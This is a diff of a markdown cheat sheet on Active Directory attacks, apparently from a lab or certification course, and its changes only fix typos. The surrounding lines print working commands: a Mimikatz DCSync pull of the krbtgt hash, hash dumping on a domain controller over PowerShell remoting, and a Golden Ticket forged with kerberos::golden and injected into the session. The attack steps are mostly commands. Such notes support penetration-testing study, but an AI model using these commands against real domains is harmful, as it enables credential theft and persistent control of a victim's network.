@@ -142,7 +142,7 @@ klist
 ```
 ## <span style="color:lightgreen">Extra Commands</span>
 
-### <span style="color:#F1C232">To use the DCSync feature for getting krbtg hash execute the below command with DA privileges</span>
+### <span style="color:#F1C232">To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges</span>
  
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
@@ -150,9 +150,9 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 > Using the DCSync option needs no code execution (no need to run Invoke-Mimikatz) on the target DC
 {: .prompt-info }
 
-### <span style="color:#F1C232">Using NTML hash of KRBTG to create a Golden Ticket</span>
+### <span style="color:#F1C232">Using NTML hash of KRBTGT to create a Golden Ticket</span>
 
-+ Requires DA privs which ca be done by used over-pass-the-hash to start a PowerShell session as domain admin.
++ Requires DA privs which can be done by used over-pass-the-hash to start a PowerShell session as domain admin.
 + Enter a PSSession to the domain controller and dump the hashes.
 
 ```powershell
@@ -168,7 +168,7 @@ Enter-PSSession $sess
 # exit PSRemote session
 exit
 
-# Get the KRBTG hash
+# Get the KRBTGT hash
 Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
 Enter-PSSession $sess
 [star-dc]:PS> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
@@ -182,7 +182,7 @@ Enter-PSSession $sess
 . .\PowerView.ps1
 Get-DomainSID -Administrator
 
-#Load the krbtg hash
+#Load the krbtgt hash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain-name-here /sid:admin-sid-here /krbtgt:krbtg-hash-here id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
  
